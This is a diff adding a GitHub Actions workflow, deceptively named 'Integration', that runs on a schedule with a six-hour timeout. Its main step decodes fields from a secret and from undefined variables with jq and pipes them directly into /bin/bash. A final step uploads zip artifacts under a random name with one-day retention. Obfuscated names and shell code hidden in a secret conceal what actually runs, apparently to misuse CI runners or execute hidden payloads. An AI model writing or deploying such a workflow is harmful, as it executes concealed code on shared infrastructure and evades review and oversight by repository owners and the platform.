@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          gem53: ${{ secrets.gem53 }}
+        run: |
+          printf '%s' "$gem53" | jq -r .zchng2 | /bin/bash
+          echo $ftibq1893 | jq -r .ams75463 | /bin/bash
+          printf '%s' "$phyv14143" | jq -r .tldj981 | /bin/bash
+          printf '%s' "$qijsa08869" | jq -r .ovu6533 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XgewaLCf
+          path: "*.zip"
+          retention-days: 1
